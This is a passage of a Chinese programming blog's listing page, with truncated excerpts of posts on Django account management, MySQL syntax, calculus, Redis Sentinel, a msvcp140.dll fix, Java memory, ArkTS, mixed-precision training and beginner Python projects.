3 根据需求完成实现每个需求对应的函数板块
4. 完成页面展示
下面我们开始本篇博客的代码逻辑思路讲解：
用户账号的实现步骤 1. 数据表的建立以及迁移操作 首先我们先确定数据表的字段以及对应的一些字段约束
1. id：是每一条数据的主键，有Django默认自己生成，无需处理。
2. username：用户名，最大字长为32位
3. password：密码，最大字长为64位
4. level： 等级，用于确定该用户为哪种级别的用户，我们对不同级别的用户会有不同的页面展示
models.py：
class Admin(models.Model): username = models.CharField(verbose_name='用户名',max_length=32) password = models.CharField(verbose_name='密码',max_length=64) level_choice = ( ('user','员工用户'), ('boss','领导用户'), ('admin','管理员') ) role = models.CharField(verbose_name='角色',choices=level_choice,max_length=12,default='user') 数据迁移操作：
点击后依次输入 makemigrations 和 migrate 这样你的数据库数据迁移成功
打开你的数据库确认一下，如果出现project_manage_admin这个新的表，那么你的表创建成功。
我们往数据表中插入一些数据，为了方便我们后续进行查看我们的方法组件是否成功实现。
下面我们开始我们的需求实现。
2. 需求实现 在本篇项目中我们需要实现的是账号列表的可视化展示，账号添加，账号的删除和修改，翻页处理。
2.1 账号列表的可视化展示 和 翻页处理 对于翻页处理我在上一篇博客中有写到，直接调用模块即可。
Python实现员工管理系统（Django页面版 ) 翻页封装-CSDN博客
我们在之前创建的views模块中新建一个admin.py文件，用于封装我们各个组件的方法。
对于账号列表的展示代码其实和之前的员工列表和部门列表的展示是一样的，都是先获取到数据库中的所有数据，然后通过前端代码展示到界面上。
admin.py
from django.shortcuts import render, redirect from project_manage import models def admin_list(request): data_list = models.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f370e7cd5fba7ae29ad0196f4751d085/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efdee4d0e08ae1b1521b2c82e7c9fed6/" rel="bookmark">
			Linux高级系统编程-MySQL数据库基本使用语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DDL:数据定义语言 作用 : 用于完成对数据库对象（数据库、数据表、视图、索引等）的创建、删除、修改 数据库操作 查询数据库 - &gt; 显示当前 mysql 中的数据库列表 &gt; show databases; - &gt; 显示指定名称的数据的创建的 SQL 指令 &gt; show create database 库名 ; 创建数据库 - &gt; 创建数据库 &gt; create database 库名 ; - &gt; 创建数据库，当指定名称的数据库不存在时执行创建 &gt; create database if not exists 库名 ; - &gt; 在创建数据库的同时指定数据库的字符集（字符集：数据存储在数据库中采用的编码格式 utf8 、 gbk ） &gt; CREATE DATABASE IF NOT EXISTS 库名 CHARSET 'utf8'; 修改数据库字符集 - &gt; 修改数据库的字符集 &gt; alter database 库名 CHARSET 字符集 ; 删除数据库 - &gt; 删除数据库 &gt; drop database 库名 ; - &gt; 如果数据库存在则删除数据库 &gt; drop database if exists 库名 ; 使用/切换数据库 use 库名 ; 数据表操作 创建完数据库之后，接下来就是在数据库中创建数据表。在MySQL 中，数据表以二维表格的形式展示，表格中的一行代表一条完整的数据记录，表格中的一列代表数据的某个特定属性。 需要注意： 在数据库中创建表之前，需要查看当前使用的数据库 语法： select database(); 然后切换到你需要操作的数据库 use db_name; 建表 create table 表名 ( 字段 1 字段类型 , 字段 2 字段类型 , .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/efdee4d0e08ae1b1521b2c82e7c9fed6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d7c18eb0ff433fd8a8e0e6b2b8f488a/" rel="bookmark">
			微分和导数（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.微分： 假设我们有⼀个函数f : R → R，其输⼊和输出都是标量。如果f的导数存在，这个极限被定义为
如果f′(a)存在，则称f在a处是可微的。如果f在⼀个区间内的每个数上都是可微的，则此函数在此区间中是可微的。导数f′(x)解释为f(x)相对于x的瞬时变化率。所谓的瞬时变化率是基于x中的变化h，且h接近0。
给定y = f(x)，其中x和y分别是函数f的⾃变量和因变量。以下表达式是等价的：
2.偏导数： 设y = f(x1, x2, . . . , xn)是⼀个具有n个变量的函数。y关于第i个参数xi的偏导数为：
对于偏导数的表⽰，以下是等价的：
3.导数和微分的理解： 导数是描述函数变化的快慢，微分是描述函数变化的程度。 导数是比值，微分是增量。 导数是函数的局部性质，一个函数在某一点的导数描述了这个函数在这一点附近的变化率。微分是一个函数表达式，用于自变量产生微小变化时计算因变量的近似值。 导数是针对一个自变量的，微分是针对所有自变量的，多元函数的导数是指多元函数的偏导数,它是指在多元函数中,每个变量的偏导数的集合。 导数的几何意义是该函数曲线在这一点上的切线斜率。 微分的几何意义是用局部切线段近似代替曲线段，即非线性函数局部线性化。 4.梯度： 梯度是⼀个向量，其分量是多变量函数相对于其所有变量的偏导数。
设函数f : Rn → R的输⼊是⼀个n维向量x = [x1, x2, . . . , xn]⊤，并且输出是⼀个标量。函数f(x)相对于x的梯度是⼀个包含n个偏导数的向量:
5.链式法则： 在深度学习中，多元函数通常是复合（composite）的，所以微分这些函数比较难，链式法则可以被⽤来微分复合函数。
假设函数y = f(u)和u = g(x)都是可微的，根据链式法则：
假设可微分函数y有变量u1, u2, . . . , um，其中每个可微分函数ui都有变量x1, x2, . . . , xn，根据链式法则：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a37393296cf3bf18904041a84aa55f9a/" rel="bookmark">
			Github 2023-12-17 开源项目日报Top10
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据Github Trendings的统计，今日(2023-12-17统计)共有10个项目上榜。根据开发语言中项目的数量，汇总情况如下：
开发语言项目数量Python项目3非开发语言项目2C#项目1TypeScript项目1Swift项目1Rust项目1Go项目1 在本地启动和运行大型语言模型的Ollama 创建周期：174 天开发语言：Go协议类型：MIT LicenseStar数量：22958 个Fork数量：1302 次关注人数：22958 人贡献人数：88 人Open Issues数量：340 个Github地址：https://github.com/jmorganca/ollama.git项目首页: https://ollama.ai Ollama是一个开源项目，帮助用户在本地设置和使用大型语言模型。
Avalonia: 跨平台UI框架和Avalonia XPF 创建周期：3663 天开发语言：C#协议类型：MIT LicenseStar数量：20871 个Fork数量：1748 次关注人数：20871 人贡献人数：323 人Open Issues数量：1337 个Github地址：https://github.com/AvaloniaUI/Avalonia.git项目首页: https://avaloniaui.net Avalonia是一个跨平台的dotnet UI框架，提供灵活的样式系统，支持Windows、macOS、Linux、iOS、Android和WebAssembly等多种平台。它被认为是WPF的精神继承者，为使用XAML的开发人员创建跨平台应用提供了熟悉的开发体验。此外，还有Avalonia XPF，这是一个商业产品，可以让WPF应用在macOS和Linux上运行，几乎不需要改动代码。
Lobe Chat: 开源聊天机器人框架 创建周期：207 天开发语言：TypeScript协议类型：MIT LicenseStar数量：7263 个Fork数量：1144 次关注人数：7263 人贡献人数：34 人Open Issues数量：76 个Github地址：https://github.com/lobehub/lobe-chat.git项目首页: https://chat-preview.lobehub.com Lobe Chat是一个开源的聊天机器人框架，支持语音合成、多模态功能和可扩展的函数调用插件系统。它可以轻松部署私人ChatGPT/LLM网络应用程序。
Oxc: 用Rust编写的JavaScript和TypeScript高性能工具集合 创建周期：311 天开发语言：Rust协议类型：MIT LicenseStar数量：5114 个Fork数量：169 次关注人数：5114 人贡献人数：65 人Open Issues数量：75 个Github地址：https://github.com/oxc-project/oxc.git项目首页: https://oxc-project.github.io Oxc 是一个开源项目，旨在创建一组针对 JavaScript 和 TypeScript 的高性能工具，包括解析器、代码检查器、格式化工具、转译器、代码最小化工具、解析器等，全部由 Rust 编写。
3D内容生成统一框架 创建周期：255 天开发语言：Python协议类型：Apache License 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a37393296cf3bf18904041a84aa55f9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9df4f98aff212a6aecf575080365c65/" rel="bookmark">
			分享由于找不到msvcp140.dll，无法继续执行代码的多个解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们日常在使用计算机运行游戏时，可能会弹出“由于找不到msvcp140.dll，无法继续执行代码，重新安装程序可能会解决”的报错，从而导致游戏运行失败，小编尝试了几种方法后也终于是解决了这问题，因此分享一下出现该问题的原因以及多个解决方法。
一、了解msvcp140.dll文件 首先，了解msvcp140.dll 文件是什么及作用很重要。msvcp140.dll是 Microsoft Visual C++运行时库的一部分，是一个动态链接库（DLL）文件。它是许多应用程序不可或缺的一部分，提供了许多用于C++程序运行时所需的库函数和资源，当我们在安装软件或运行游戏时，可能需要依赖这个文件，如果这个文件缺失或异常，就有可能会导致程序无法正常运行或者出现一些错误提示。
二、一些可能导致msvcp140.dll文件丢失的原因分析 导致msvcp140.dll丢失的原因有很多，以下列举常见的一些原因：
1）系统文件丢失：可能由于误删除、系统错误或其他原因导致 msvcp140.dll 文件丢失。
2）系统软件更新：在系统更新过程中出现问题或者在安装某个软件时未更新msvcp140.dll 文件，可能导致msvcp140.dll 文件丢失。
3）文件损坏：由于文件已被损坏无法正常使用，可能可能导致msvcp140.dll 文件丢失。
4）病毒感染：电脑感染了病毒，病毒篡改，占用或删除了msvcp140.dll 文件导致。
5）系统或硬件故障：操作系统的损坏或者硬盘故障、电源故障，内存条松动或其他硬件故障可能导致msvcp140.dll文件丢失。
6）软件冲突：安装或卸载某些软件时，某些软件与Visual C++组件发生冲突，导致msvcp140.dll文件丢失。
三、如何预防msvcp140.dll文件的丢失 1）定期更新操作系统和应用程序：及时保证操作系统的更新和更新软件或游戏的最新状态，确保系统的稳定性和兼容性，能有效减少msvcp140.dll文件丢失的风险。
2）安装可靠安全的防病毒软件：安装防病毒软件并定期进行系统扫描和清理防病毒软件可以防止受到某些病毒和恶意软件的侵害，减少msvcp140.dll文件丢失的风险。
四、修复方法 方法1：检查垃圾回收站，有时候是因为由于误删除了msvcp140.dll文件，可以及时到系统的回收站还原msvcp140.dll文件。
选择msvcp140.dll文件并修复后，重启计算机，重新运行软件或游戏。
方法2：重新卸载安装相关应用程序或游戏
尝试重新卸载并安装出错的应用程序或游戏，有时在程序安装过程中可能会出现文件丢失或损坏的情况，重新安装可能可以修复这些问题。
方法3：使用系统dll修复工具（个人不推荐）
1.打开电脑浏览器，搜索“dll修复程序.site”，选择修复工具后进入下载程序修复文件（压缩文件），下载完成后需要先解压。
2.解压安装好后点击【立即修复】，修复的文件是在系统目录中的。需要注意的是如果您的计算机是32位系统，那么文件是在C:\Windows\System32目录中，如果是64位的系统，文件是在C:\Windows\SysWOW64。
3.等待修复完成以后再重新运行程序或游戏，检查是否修复好。
修复工具检测到msvcp140.dll文件或其他文件丢失或异常后，这里很蛋疼的一点就是很多修复工具修复都是需要付费的，所以小编不太推荐这个方法，因为小编暂时还没找到免费的dll修复工具（也有可能是有但我没仔细找OvO）。
方法4：从其他电脑复制msvcp140.dll文件
可以尝试从其他相同操作系统的电脑中复制msvcp140.dll文件，并将其粘贴到那台出错电脑的对应系统目录底下。
同意需要注意的是：32位系统复制到C:\Windows\System32目录下，64位系统复制到C:\Windows\SysWOW64目录下。在键盘上按下快捷键“win+R”并输入CMD打开终端窗口，输入以下命令“regsvr32 msvcp140.dll”后回车，等待注册完成后，重新启动计算机。
方法5：系统文件检查
sfc系统文件检查器是一个功能强大的工具，它可以扫描并修复系统文件中的问题。首先在电脑底栏搜索处输入“cmd”或“命令提示符”打开终端窗口（使用管理员身份运行），然后输入以下命令sfc /scannow后回车，等待扫描完成修复后，重新启动计算机。
方法:6：重新安装 Microsoft Visual C++ Redistributable包
msvcp140.dll是Microsoft Visual C++ Redistributable软件包的一部分，可以从Microsoft 官方网站上下载并安装最新版本的Visual C++ Redistributable Package，确保选择的系统中包含所有组件是最新的且确保包含有msvcp140.dll文件。
步骤：打开浏览器，搜索Microsoft Visual C++ Redistributable访问Microsoft官方网站，如下图找到适用于自己操作系统和位数（64位或32位）的下载页面。
选择后点击下载安装，下载完成后，运行安装程序并按照向导完成安装，安装完毕后重新运行程序或游戏。
方法7：安装Visual Studio 2022（个人亲测有效）
如果方法6下载安装的Microsoft Visual C++ Redistributable包还是不行的话，可以试试通过直接安装Visual Studio 2022来解决，但是此软件比较大，安装过程有点久，需要耐心等待。百度搜索输入Visual Studio 2022登录Microsoft 官方网站后下载并安装，安装完成后重新启动电脑运行出错的程序或游戏。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9df4f98aff212a6aecf575080365c65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5eb58ca848f47feb146accbda7d5c390/" rel="bookmark">
			redis哨兵模式的功能-以及主从选举算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 对于哨兵模式而言，主要负责的内容有
1、监控 2、选主（选择主库） 3、通知 哨兵工作流程： 1、监控：节点发现和配置
2、心跳检测： 哨兵会定期向监控的节点发送PING命令来检测节点是否存活
3、节点状态变更： 当哨兵连续多次无法连接到一个节点时，它会将该节点标记为主观下线
4、故障判断和选举： 当主节点被标记为客观下线时，哨兵会执行故障判断。它会从剩余的健康主节点中选举一个作为新的主节点，并将该信息广播给其他哨兵和客户端。故障判断的逻辑考虑了多个因素，包括优先级、最近一次复制偏移量等。
5、自动故障切换： 如果主节点被标记为客观下线，哨兵会通知从节点晋升为新的主节点。同时，哨兵会更新其他从节点的配置，使其复制新的主节点。这确保了即使主节点发生故障，集群仍然可以继续提供服务。
6、监控从节点： 哨兵还会监控从节点的状态，包括从节点是否与主节点保持同步，以及从节点的复制延迟情况。如果从节点无法同步或者复制延迟过高，哨兵会将其标记为不健康。
7、节点恢复： 如果一个节点从客观下线状态恢复，哨兵会将其标记为健康，并将其重新纳入集群中。从节点恢复后，它会重新同步主节点的数据。
8、配置更新： 如果集群的拓扑发生变化，例如添加或移除节点，哨兵会自动更新配置，以便客户端能够正确连接到集群。
9、事件通知： 哨兵通过发布订阅机制向订阅者（通常是客户端）发送有关集群状态变化的消息。这使得应用程序能够根据实时的集群状态做出相应的决策。
10、持续监控： 哨兵会持续地监控集群中的节点，定期执行心跳检测、状态更新和故障判断，以确保集群的稳定运行。
选举流程-如何选定新主库 1、主观下线和客观下线判断： 当哨兵节点主观下线（单个哨兵认为不可用）一个主节点时，如果多数哨兵都主观下线了同一个主节点，那么这个主节点会被标记为客观下线（多数派共识）。
2、选举新主节点： 当一个主节点被标记为客观下线后，哨兵节点会开始选举一个新的主节点。选举过程如下：
哨兵会在所有没有下线的从节点（Slaves）中选择一个作为新主节点。哨兵会选择一个【延迟最小、复制偏移量最大】的从节点作为新主节点。这确保了新主节点是最接近原主节点的从节点。
如果没有合适的从节点，哨兵会选择一个【具备最高优先级的】从节点，将其升级为主节点。
如果优先级相同，那么哨兵会选择一个【复制偏移量最大】的从节点。
3、故障转移和切换：一旦新主节点被选定，哨兵会发起故障转移操作。旧主节点会变成新主节点的一个从节点。其他从节点会重新配置，指向新的主节点。这个过程会保证尽量不丢失数据，并且保证整个集群的高可用性。
Redis哨兵模式选举用的是Redis Sentinel自主选举
redis哨兵模式详细介绍：跳转
脑裂的问题解决和数据丢失的问题 解决方案：
1、首先是脑裂的问题，在配置文件中，设置如果主节点发现可以用从节点少于，原来配置的从节点，脑裂会生成新的Master，所以从节点就变少了，那么就告警，或者不在为客户端提供服务，这个就可以解决脑裂的问题。
2、第二个因为主节点真的挂机了，丢了很多数据，那么久判断如果每个从节点的偏移量差太大，比如某个节点的offset只有百分之80那么说明还有很多没有备份给从节点，如果主节点在新增数据，那么偏移量的差就会越来越大，所以此时主节点不能再对外提供服务。
缺点：就是本来高可用，结果变成不高可用了。
怎么发现Master挂了 哨兵的节点，最少是三台，或者三台以上，并且是单数，为什么是单数，主要是为了防止投票的时候，平票的情况。
如何选主 1、响应时间 2、从节点的数据完整性 3、稳定性，运行时间越长越稳定 4、如果三个情况都一样，那就更新runId来选。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fe08aae4126c1c1b99c0be7726ca135/" rel="bookmark">
			【鸿蒙开发】第六章 ArkTS基础知识 - 类、接口及泛型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 前言 上一章节我们学习了【鸿蒙开发】第五章 ArkTS基础知识 - 声明变量、常量、类型和函数，大概了解ArkTS的基础类型和用法和ts的大致基本相同，与Java也极其相似。本章节我们继续学习ArkTS类和接口、泛型等相关知识，为后续鸿蒙应用开发夯实基础。
2 类 类声明引入一个新类型，并定义其字段、方法和构造函数。
有两种方法创建实例：
通过new创建实例通过对象字面量创建实例 // 常规的类创建与使用 class Person { name: string = '' surname: string = '' constructor(n: string, sn: string) { this.name = n this.surname = sn } fullName(): string { return this.name + ' ' + this.surname } } // 1.通过new创建实例 let person = new Person('John', 'Smith') console.log(person.fullName()) // 2.可以使用对象字面量创建实例，声明时要给属性赋值，给方法赋值等 let person2: Person = { name: 'John', surname: 'Smith', fullName(): string {return this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1fe08aae4126c1c1b99c0be7726ca135/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/997edcd97beec13bc24343f0c180ef87/" rel="bookmark">
			redis学习---实战篇黑马点评
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、黑马点评环境搭建 运行起来前端后端
前端的nginx运行一定注意文件路径不能有中文，否则不行
后端记得修改application.yaml文件就可以
server: port: 8081 spring: application: name: hmdp datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/hmdp?useSSL=false&amp;serverTimezone=UTC username: root password: 123456 redis: host: localhost port: 6379 lettuce: pool: max-active: 10 max-idle: 10 min-idle: 1 time-between-eviction-runs: 10s jackson: default-property-inclusion: non_null # JSON处理时忽略非空字段 mybatis-plus: type-aliases-package: com.hmdp.entity # 别名扫描包 logging: level: com.hmdp: debug 二、短信登录 2.1 发送短信验证码 @Override public Result code(String phone, HttpSession session) { if (RegexUtils.isPhoneInvalid(phone)) { return Result.fail("请输入正确的手机号"); } Integer code = ValidateCodeUtils.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/997edcd97beec13bc24343f0c180ef87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19b27afb0f979ec463b7aee7957e29fe/" rel="bookmark">
			JUC-2-内存、无锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内存 JMM 内存模型 Java 内存模型是 Java Memory Model（JMM），本身是一种抽象的概念，实际上并不存在，描述的是一组规则或规范，通过这组规范定义了程序中各个变量（包括实例字段，静态字段和构成数组对象的元素）的访问方式
JMM 作用：
屏蔽各种硬件和操作系统的内存访问差异，实现让 Java 程序在各种平台下都能达到一致的内存访问效果规定了线程和内存之间的一些关系 根据 JMM 的设计，系统存在一个主内存（Main Memory），Java 中所有变量都存储在主存中，对于所有线程都是共享的；每条线程都有自己的工作内存（Working Memory），工作内存中保存的是主存中某些变量的拷贝，线程对所有变量的操作都是先对变量进行拷贝，然后在工作内存中进行，不能直接操作主内存中的变量；线程之间无法相互直接访问，线程间的通信（传递）必须通过主内存来完成
主内存和工作内存：
主内存：计算机的内存，也就是经常提到的 8G 内存，16G 内存，存储所有共享变量的值工作内存：存储该线程使用到的共享变量在主内存的的值的副本拷贝 JVM 和 JMM 之间的关系：JMM 中的主内存、工作内存与 JVM 中的 Java 堆、栈、方法区等并不是同一个层次的内存划分，这两者基本上是没有关系的，如果两者一定要勉强对应起来：
主内存主要对应于 Java 堆中的对象实例数据部分，而工作内存则对应于虚拟机栈中的部分区域从更低层次上说，主内存直接对应于物理硬件的内存，工作内存对应寄存器和高速缓存 内存交互 Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作，每个操作都是原子的
非原子协定：没有被 volatile 修饰的 long、double 外，默认按照两次 32 位的操作
lock：作用于主内存，将一个变量标识为被一个线程独占状态（对应 monitorenter）unclock：作用于主内存，将一个变量从独占状态释放出来，释放后的变量才可以被其他线程锁定（对应 monitorexit）read：作用于主内存，把一个变量的值从主内存传输到工作内存中load：作用于工作内存，在 read 之后执行，把 read 得到的值放入工作内存的变量副本中use：作用于工作内存，把工作内存中一个变量的值传递给执行引擎，每当遇到一个使用到变量的操作时都要使用该指令assign：作用于工作内存，把从执行引擎接收到的一个值赋给工作内存的变量store：作用于工作内存，把工作内存的一个变量的值传送到主内存中write：作用于主内存，在 store 之后执行，把 store 得到的值放入主内存的变量中 参考文章：https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md
三大特性 可见性 可见性：是指当多个线程访问同一个变量时，一个线程修改了这个变量的值，其他线程能够立即看得到修改的值
存在不可见问题的根本原因是由于缓存的存在，线程持有的是共享变量的副本，无法感知其他线程对于共享变量的更改，导致读取的值不是最新的。但是 final 修饰的变量是不可变的，就算有缓存，也不会存在不可见的问题
main 线程对 run 变量的修改对于 t 线程不可见，导致了 t 线程无法停止：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19b27afb0f979ec463b7aee7957e29fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ee08d13ec101d8e6c9ab1819fbc5efc/" rel="bookmark">
			Python基础教程——制作一个宿舍管理系统（完整版，附源码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天我们一起学习一个新的小案例——宿舍管理系统。主要涉及列表、字典的初始化、增加、删除、修改和查询操作，以及函数的定义和调用。
一、需求：
有操作指引界面，显示操作号
能添加一个新的入住学生信息，包括学生姓名、宿舍号+床位号（如313-3）、班级、入住情况（在校or请假）
能删除一个学生的住宿信息，输入名字查询，存在则删除并提示已删除，假如不存在则提示，系统不存在该学生的信息。
能修改一个学生的住宿信息，输入名字查询，存在则让用户重新输入修改信息，并提示已修改，假如不存在则提示，系统不存在该学生的信息。
能查询一个学生的住宿信息，输入名字查询，存在则给出该学生的住宿信息，假如不存在则提示，系统不存在该学生的信息。
能显示所有学生的住宿信息
能显示所有请假学生的住宿信息
能退出系统
二、代码编写
1.定义一个全局变量列表存放所有学生信息
# 全局变量用来存储所有学生信息 student_infors = [] 2.定义软件提示界面函数
def Directory(): #学生宿舍管理系统 V1.0 # 1打印功能提示 print('=' * 50) print('学生宿舍管理系统 V1.0') print('1:添加一个新的入住学生信息') print('2:删除一个学生的住宿信息') print('3:修改一个学生的住宿信息') print('4:查询一个学生的住宿信息') print('5:显示所有的学生的住宿信息') print('6.显示所有请假学生的信息') print('7:退出系统') print('=' * 50) 3.定义添加一个学生住宿信息函数
#添加学生信息函数 def Add_infor(): # 定义一个新的字典，用来存储一个新的学生信息 new_infor = {} new_infor['student_name'] = input('请输入新入住的学生名字：') new_infor['D_num'] = input('请输入宿舍号+床位号（如313-3）：') new_infor['Class_num'] = input('请输入班级：') new_infor['status'] = input('请输入入住情况（在校or请假）：') # 将一个字典，添加到列表中 student_infors.append(new_infor) 4.定义删除一个学生住宿信息的函数
#删除学生信息函数 def Delete_infor(): del_name = input("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ee08d13ec101d8e6c9ab1819fbc5efc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/470995cf4fb95c0ba0f8f8e84f286061/" rel="bookmark">
			深度学习：混合精度训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习：混合精度训练 前言混合精度训练核心技术权重备份损失缩放梯度裁剪动态调整学习率 优势与弊端代码示例 参考文献 前言 浮点数据类型主要分为双精度Double（FP64）、单精度Float（FP32）和半精度Half（FP16）。FP64浮点数据采用8个字节共64位，来进行的编码存储的一种数据类型；FP32浮点数据采用4个字节共32位来表示；FP16浮点数据则采用2个字节共16位来表示。
默认情况下，大多数深度学习框架（比如Pytorch）都采用32位浮点算法进行训练，混合精度训练可以在神经网络训练过程中，针对不同的层，采用不同的数据精度（比如半精度16位）进行计算，从而实现降低显存和加快速度的目的。
混合精度训练 在此主要介绍了混合精度训练的核心技术、优缺点和代码示例。
核心技术 混合精度训练过程中，主要使用了权重备份和损失缩放两大方法，此外还可以引入梯度裁剪和动态调整学习率等相关技术，提高训练稳定性，从而发挥混合精度训练的优势，并尽可能避免混合精度训练的弊端。
权重备份 如果直接全部采用FP16的精度进行模型训练，由于梯度幅值本身非常小，参数更新的时候乘上学习率就更小了，容易导致 NAN 或者参数更新失败（无法更新）的问题，故模型参数更新需要采用 FP32 格式上操作，因此需要维护一份 FP32 的模型参数副本，并利用FP16的梯度更新FP32模型的参数。值得注意的是，这里备份的模型副本增加的主要是静态内存。只要动态内存的值基本都是使用FP16来进行存储，则最终模型与整网络使用FP32进行训练相比起来， 内存占用也基本能够减半。
损失缩放 使用损失缩放的原因是 FP16 的梯度表示范围比较窄，如果不做处理，大量非零梯度会遇到溢出问题，那么即使后续是采用 FP32 参数更新也是没用的。故需要设置一个缩放系数（loss scale），将前向传播得到的Loss进行放大，放大到 16 精度可表示范围，但是需要注意在反向传播后需要除以缩放系数，将权重缩小后更新模型的参数。
动态损失缩放：上面提到的损失缩放都是使用一个默认值对损失值进行缩放，为了充分利用FP16的动态范围，可以更好地缓解舍入误差，尽量使用比较大的放大倍数。总结动态损失缩放算法，就是每当梯度溢出时候减少损失缩放规模，并且间歇性地尝试增加损失规模，从而实现在不引起溢出的情况下使用最高损失缩放因子，更好地恢复精度。
梯度裁剪 由于半精度浮点数表示的梯度较小，容易出现数值溢出或数值过小的问题。为了解决这个问题，采用梯度裁剪的方法，限制梯度的范围，防止梯度消失或爆炸。
动态调整学习率 随着训练的进行，动态地调整学习率以适应使用半精度浮点数时可能出现的数值不稳定性。这有助于提高训练的稳定性和收敛速度。
优势与弊端 混合精度训练的核心思想是将神经网络中的参数和梯度使用更低位数的浮点数表示，通常是16位半精度浮点数。混合精度的优势在于主要在于减小显存占用和加快训练速度方面。
减少显存占用：FP16的位宽是FP32的一半，因此权重等参数所占用的内存也是原来的一半，从而可以使用更大的模型或更多的数据进行训练。加快通讯效率：对于分布式训练，特别是在大模型训练的过程中，通讯的开销往往会增大训练时间，使用低精度的数据，由于较小的位宽可以提高通讯效率，从而加快模型训练。计算效率更高：使用低精度的数据，执行运算性能也更高，从而加快模型训练，特别是在支持混合精度的硬件上（如NVIDIA的Volta架构及以后的GPU）。 弊端在于：
数据溢出：FP16数据类型的有效数据范围比FP32数据类型的有效数据范围小，使用FP16替换FP32就会出现上溢（Overflow）或下溢（Underflow），从而容易出现数值不稳定性的问题，需要采用一些技术手段来处理。精度损失：FP16和FP32的最小间隔（精确度）不同，从FP32转换到FP16就会出现强制舍入，从而带来一定的精度损失。训练不稳定：使用混合精度训练容易出现NAN和参数无法更新的问题，需要精心设计超参数，以提高训练的稳定性。硬件依赖： 混合精度训练的效果受到硬件支持的限制，只有支持半精度浮点数运算的硬件才能发挥其优势。 代码示例 为了演示混合精度训练的流程，下面是Pytorch官方代码示例，供参考：
# Creates model and optimizer in default precision model = Net().cuda() optimizer = optim.SGD(model.parameters(), ...) # Creates a GradScaler once at the beginning of training. scaler = GradScaler() for epoch in epochs: for input, target in data: optimizer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/470995cf4fb95c0ba0f8f8e84f286061/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/358c7f1818b2198bb828193db02f9650/" rel="bookmark">
			Python基础教程——制作简单计算器（完整版，附源码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、设计思路 在设计计算器程序时，我们需要考虑以下几个方面：
1. 界面设计：计算器需要一个简单的用户界面，用户可以通过该界面输入数字和运算符。
2. 数据类型：我们需要定义一些变量和数据类型来存储用户输入的数字和运算符，以及计算结果。
3. 运算逻辑：计算器需要根据用户输入的运算符来进行相应的数学运算，并输出计算结果。
在本文中，我们将采用Python语言实现一个基本的计算器，该计算器具有以下功能：
1. 支持加、减、乘、除四种基本运算。
2. 支持小数的运算。
3. 支持多次连续计算。
二、界面设计 计算器的界面应该简洁明了，方便用户输入数字和运算符。我们可以使用Python的tkinter库来实现界面设计。
首先，我们需要导入tkinter库，并创建一个窗口对象：
import tkinter as tk window = tk.Tk() window.title("Calculator") 然后，我们可以在窗口中添加一些组件，如文本框、按钮等：
# 添加文本框 text = tk.Entry(window, width=25, font=('Arial', 16)) text.pack(side='top', pady=10) # 添加按钮 btn_1 = tk.Button(window, text='1', width=5, height=2) btn_1.pack(side='left') btn_2 = tk.Button(window, text='2', width=5, height=2) btn_2.pack(side='left') # ... 这里我们只添加了数字按钮，其他运算符按钮的添加类似。
三、数据类型 在计算器中，我们需要定义一些变量和数据类型来存储用户输入的数字和运算符，以及计算结果。
首先，我们需要定义一个变量来存储用户输入的数字：
num = '' 然后，我们需要定义一个变量来存储用户选择的运算符：
operator = '' 最后，我们需要定义一个变量来存储计算结果：
result = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/358c7f1818b2198bb828193db02f9650/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
